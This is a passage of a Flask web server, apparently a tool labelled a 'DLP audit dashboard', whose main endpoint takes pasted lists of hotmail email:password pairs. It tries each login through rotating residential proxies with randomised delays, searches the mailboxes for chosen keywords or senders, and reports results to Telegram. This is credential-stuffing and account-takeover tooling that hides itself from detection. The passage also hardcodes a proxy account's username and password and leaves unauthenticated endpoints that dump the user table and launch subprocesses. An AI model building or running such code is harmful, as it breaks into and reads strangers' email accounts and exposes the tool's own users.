    senders = data.get('senders', '').strip()
    
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q('UPDATE users SET saved_senders=? WHERE id=?'), (senders, session['user_id']))
    conn.commit()
    conn.close()
    
    return jsonify({"success": "Remitentes guardados correctamente", "saved_senders": senders})


@app.route('/')
def index():
    return send_from_directory('.', 'dashboard.html')


@app.route('/api/audit', methods=['POST'])
def start_audit():
    data = request.json
    credentials = data.get('credentials', '').strip()
    keyword = data.get('keyword', '').strip()
    sender = data.get('sender', '').strip()
    proxies_text = data.get('proxies', '').strip()

    if not credentials:
        return jsonify({"error": "No se proporcionaron credenciales"}), 400
    if not keyword and not sender:
        return jsonify({"error": "Ingresa al menos una keyword o un correo remitente"}), 400

    creds = []
    for line in credentials.split('\n'):
        line = line.strip()
        if line and ':' in line:
            em, pwd = line.split(':', 1)
            creds.append((em.strip(), pwd.strip()))

    if not creds:
        return jsonify({"error": "Formato: correo@hotmail.com:contraseña"}), 400

    tg_chat_id = data.get('tgChatId', '').strip()
    # Si no hay chat_id en el request, usar el del usuario logueado
    if not tg_chat_id and 'user_id' in session:
        try:
            _conn = get_db_conn()
            _c = _conn.cursor()
            _c.execute(q('SELECT telegram_chat_id FROM users WHERE id=?'), (session['user_id'],))
            _row = _c.fetchone()
            _conn.close()
            if _row and _row[0]:
                tg_chat_id = _row[0]
        except Exception:
            pass

    proxies = load_proxies_from_text(proxies_text) if proxies_text else []

    # ── Render fallback: load all proxies from DEFAULT_PROXIES env var ──
    if not proxies:
        default_proxies_env = os.environ.get("DEFAULT_PROXIES", "").strip()
        if default_proxies_env:
            proxies = load_proxies_from_text(default_proxies_env.replace(",", "\n"))
            print(f"[AUTO-PROXY] Cargados {len(proxies)} proxies desde env DEFAULT_PROXIES")
        else:
            # 🔑 INYECCIÓN MAESTRA: Si no hay proxy en la UI, usar IPRoyal por defecto
            iproyal_url = "geo.iproyal.com:12321:iFWCvoL1YiGW0U1T:gAPHeqlqy33PlWrj"
            proxies = load_proxies_from_text(iproyal_url)
            print("[AUTO-PROXY] Usando proxy Residencial IPRoyal por defecto para scan manual.")

    session_id = str(random.randint(10000, 99999))
    audit_queues[session_id] = queue.Queue()

    def audit_thread():
        q = audit_queues[session_id]
        emit_event(q, "start", {
            "total_accounts": len(creds),
            "keyword": keyword,
            "sender": sender,
            "proxies_count": len(proxies)
        })

        for i, (em, pwd) in enumerate(creds):
            # 1. Check if user stopped the process
            if stop_flags.get(session_id):
                emit_event(q, "warning", {"message": "Auditoría cancelada por el usuario."})
                break

            emit_event(q, "account_start", {"email": em, "index": i + 1, "total": len(creds)})
            proxy = random.choice(proxies) if proxies else None
            run_audit(q, em, pwd, keyword, sender, proxy, tg_chat_id, session_id=session_id)

            if i < len(creds) - 1:
                pause = random.uniform(2.5, 5.0)
                emit_event(q, "pause", {"seconds": round(pause, 1)})
                time.sleep(pause)

        emit_event(q, "all_done", {})
        # Cleanup stop flag
        if session_id in stop_flags:
            del stop_flags[session_id]

    threading.Thread(target=audit_thread, daemon=True).start()
    return jsonify({"session_id": session_id, "total": len(creds)})

@app.route('/api/stop-audit', methods=['POST'])
def stop_audit():
    sid = request.json.get('session_id')
    if sid:
        stop_flags[sid] = True
        return jsonify({"message": "Deteniendo auditoría..."})
    return jsonify({"error": "No hay sesión activa"}), 400


@app.route('/api/stream/<session_id>')
def stream(session_id):
    def event_stream():
        q = audit_queues.get(session_id)
        if not q:
            yield f"data: {json.dumps({'type': 'error', 'message': 'Session not found'})}\n\n"
            return
        while True:
            try:
                # Render has a 100s idle timeout. We wake up every 15s to send a heartbeat.
                d = q.get(timeout=15)
                yield f"data: {d}\n\n"
                if json.loads(d).get('type') == 'all_done':
                    break
            except queue.Empty:
                # Send a comment/heartbeat to keep the HTTP connection alive
                yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"

    return Response(event_stream(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})


@app.route('/api/deep-scan-status', methods=['GET'])
def deep_scan_status():
    if 'username' not in session: return jsonify({"error": "No authenticated"}), 401
    try:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute(q("SELECT id, status, files_scanned FROM scan_requests WHERE username = ? ORDER BY id DESC LIMIT 1"), (session['username'],))
        row = c.fetchone()
        conn.close()
        if row:
            return jsonify({"id": row[0], "status": row[1], "files_scanned": row[2]})
        return jsonify({"status": "none"})
    except Exception as e:
        print(f"[ERROR] Error fetching deep scan status: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/pause-scan', methods=['POST'])
def pause_scan():
    if 'username' not in session: return jsonify({"error": "No authenticated"}), 401
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q("UPDATE scan_requests SET status = 'paused' WHERE username = ? AND status = 'processing'"), (session['username'],))
    conn.commit()
    conn.close()
    return jsonify({"message": "Escaneo pausado correctamente"})

@app.route('/api/resume-scan', methods=['POST'])
def resume_scan():
    if 'username' not in session: return jsonify({"error": "No authenticated"}), 401
    conn = get_db_conn()
    c = conn.cursor()
    c.execute(q("UPDATE scan_requests SET status = 'pending' WHERE username = ? AND status = 'paused'"), (session['username'],))
    conn.commit()
    conn.close()
    return jsonify({"message": "Escaneo reanudado correctamente"})

@app.route('/api/deep-scan', methods=['POST'])
def trigger_deep_scan():
    if 'username' not in session:
        return jsonify({"error": "No has iniciado sesión"}), 401
    
    username = session['username']
    
    try:
        conn = get_db_conn()
        c = conn.cursor()
        
        # Verificar si ya hay uno pendiente
        c.execute(q("SELECT id FROM scan_requests WHERE username = ? AND status = 'pending'"), (username,))
        if c.fetchone():
            conn.close()
            return jsonify({"error": "Ya tienes un escaneo profundo en espera"}), 400
            
        c.execute(q("INSERT INTO scan_requests (username, status) VALUES (?, 'pending')"), (username,))
        conn.commit()
        conn.close()
        
        return jsonify({"message": "✅ Escaneo profundo solicitado. Se procesará en segundo plano poco a poco."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/test-render-simulation', methods=['GET', 'POST'])
def test_render_simulation_trigger():
    import subprocess
    import sys
    script_path = os.path.join(os.path.dirname(__file__), "run_simulation.py")
    log_path = os.path.join(os.path.dirname(__file__), "simulation.log")
    with open(log_path, "w") as f:
        f.write("--- LOG START ---\n")
    
    # Run and log output instead of redirecting to DEVNULL
    with open(log_path, "a") as f:
        subprocess.Popen([sys.executable, script_path], stdout=f, stderr=subprocess.STDOUT)
        
    return jsonify({"status": "Simulation triggered on Render and logging to simulation.log"})

@app.route('/api/debug-simulation-logs', methods=['GET'])
def debug_simulation_logs():
    log_path = os.path.join(os.path.dirname(__file__), "simulation.log")
    try:
        with open(log_path, "r") as f:
            logs = f.read()
        return f"<pre>{logs}</pre>"
    except Exception as e:
        return f"Error reading logs: {e}"

@app.route('/api/debug-db-render', methods=['GET'])
def debug_db_render_inspect():
    try:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute(q("SELECT id, username, telegram_chat_id, saved_senders, allow_247 FROM users"))
        rows = c.fetchall()
        conn.close()
        
        users = []
        for r in rows:
            users.append({
                "id": r[0],
                "username": r[1],
                "telegram_chat_id": r[2],
                "saved_senders": r[3],
                "allow_247": r[4]
            })
        return jsonify({"users": users})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
@app.route('/api/cron-wakeup', methods=['GET'])
def cron_wakeup():
    # Este endpoint responde 200 OK y mantiene vivo el servidor de Render
    # Si Telethon o Twitter se cayeron porque fallaron por red, el cron-job los puede reactivar
    return jsonify({"status": "Alive", "message": "Render server is awake. Telethon and Twitter daemons are running."}), 200

@app.route('/api/twitter-wakeup', methods=['GET', 'POST'])
def twitter_wakeup_trigger():
    import subprocess
    import sys
    try:
        script_path = os.path.join(os.path.dirname(__file__), "telethon_listener.py")
        subprocess.Popen([sys.executable, script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return jsonify({"status": "Success", "message": "Telethon listener awakened from Twitter signal."}), 200
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)}), 500

@app.route('/api/bot-logs')
def get_bot_logs():
    try:
        import os
        if not os.path.exists("listener_log.txt"):
            return "El archivo de logs aún no existe.", 404
        with open("listener_log.txt", "r", encoding="utf-8") as f:
            lines = f.readlines()
            return Response("".join(lines[-200:]), mimetype="text/plain")
    except Exception as e:
        return str(e), 500

if os.environ.get("IS_SUBPROCESS") != "1":
    def start_twitter_listener():
        print("🐦 [DAEMON] Arrancando Conexión de API X (Twitter) en 10 segundos...", flush=True)
        import time
        time.sleep(10)
        import subprocess
        import sys
        try:
            env = os.environ.copy()
            env["IS_SUBPROCESS"] = "1"
            subprocess.Popen([sys.executable, "twitter_trigger.py"], stdout=sys.stdout, stderr=sys.stderr, env=env)
            print("✅ [DAEMON] API X (Twitter) escuchando en subproceso", flush=True)
        except Exception as e:
            print(f"❌ Error arrancando Twitter Listener desde server: {e}")

    # Iniciar solo el bot de Twitter en segundo plano
    tw_thread = threading.Thread(target=start_twitter_listener, daemon=True)
    tw_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5050))
    print("\n╔══════════════════════════════════════════════════╗")
    print("║  🔍 DLP AUDIT DASHBOARD                        ║")
    print(f"║  🚀 WAITRESS/GUNICORN SERVER: PUERTO {port}    ║")
    print("╚══════════════════════════════════════════════════╝\n")
    from waitress import serve
    serve(app, host='0.0.0.0', port=port, threads=8)
